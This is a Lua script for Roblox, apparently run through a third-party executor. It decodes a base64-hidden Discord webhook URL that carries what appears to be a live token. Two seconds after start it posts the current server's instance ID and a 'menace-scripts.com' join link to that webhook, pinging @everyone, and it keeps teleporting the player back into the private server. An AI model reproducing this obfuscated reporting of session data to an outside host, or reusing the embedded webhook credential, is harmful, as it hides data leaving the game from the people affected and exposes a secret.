local gge = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUxNTk5ODI3MTc0OTc1MDk1Ny9iUEZfRnJRLTVBQzNKaXE4d2dpLUZWRlNXSm8wUlpGQnJ1dUUwYXQ5V2huX1VEc2RwNmt6V0lhZ29Wdkh3TEtPSW81RA=="
local PLACE_ID = game.PlaceId 
local RESTART_DELAY = 20

local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")

local LocalPlayer = Players.LocalPlayer
local isRestarting = false
local playerJoined = false

local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'

local function decodeBase64(data)
	data = string.gsub(data, '[^'..b64chars..'=]', '')
	return (data:gsub('.', function(x)
		if (x == '=') then return '' end
		local r,f='',(b64chars:find(x)-1)
		for i=6,1,-1 do r=r..(f%2^i - f%2^(i-1) > 0 and '1' or '0') end
		return r
	end):gsub('%d%d%d%d%d%d%d%d', function(x)
		local c=0
		for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
		return string.char(c)
	end))
end

local decodedWebhook = decodeBase64(gge)

local function sendDiscordEmbed()
	local job = game.JobId
	if job == "" then
		job = "Studio-Local-Instance"
	end

	local joinLink = "https://menace-scripts.com/join?place=" .. tostring(PLACE_ID) .. "&instance=" .. job

	local embedData = {
		["content"] = "@everyone",
		["embeds"] = {
			{
				["title"] = "🚀 New Server Created!",
				["description"] = "A brand new private server instance has been generated and is ready to join.",
				["color"] = 6570495, -- Couleur Hex #6441A5 (style violet Menace)
				["fields"] = {
					{
						["name"] = "🔗 Join Link",
						["value"] = "[**Click here to join the server**](" .. joinLink .. ")",
						["inline"] = false
					},
					{
						["name"] = "📌 Server Instance ID",
						["value"] = "`" .. job .. "`",
						["inline"] = false
					}
				},
				["footer"] = {
					["text"] = "Menace Scripts • Server Manager",
					["icon_url"] = "https://i.imgur.com/8N628k6.png"
				},
				["timestamp"] = DateTime.now():ToIsoDate()
			}
		}
	}

	local payload = HttpService:JSONEncode(embedData)
	local httpRequest = (syn and syn.request) or (http and http.request) or http_request or request

	if httpRequest then
		httpRequest({
			Url = decodedWebhook,
			Method = "POST",
			Headers = {
				["Content-Type"] = "application/json"
			},
			Body = payload
		})
	end
end

local function getOtherPlayersCount()
	local count = 0
	for _, player in ipairs(Players:GetPlayers()) do
		if player ~= LocalPlayer then
			count = count + 1
		end
	end
	return count
end

local function restartPrivateServer()
	if isRestarting then return end
	isRestarting = true

	local vipServerId = game.VIPServerId

	if vipServerId ~= "" then
		TeleportService:TeleportToPrivateServer(PLACE_ID, vipServerId, {LocalPlayer})
	else
		TeleportService:Teleport(PLACE_ID, LocalPlayer)
	end
end

TeleportService.TeleportInitFailed:Connect(function(player, teleportResult, errorMessage)
	if player == LocalPlayer then
		isRestarting = false
		task.wait(5)
		restartPrivateServer()
	end
end)

Players.PlayerAdded:Connect(function(player)
	if player ~= LocalPlayer then
		playerJoined = true
	end
end)

Players.PlayerRemoving:Connect(function(player)
	if player ~= LocalPlayer then
		task.wait(1)
		if getOtherPlayersCount() == 0 and playerJoined then
			task.spawn(function()
				task.wait(RESTART_DELAY)
				
				if getOtherPlayersCount() == 0 then
					restartPrivateServer()
				end
			end)
		end
	end
end)

task.spawn(function()
	task.wait(2)
	sendDiscordEmbed()
end)
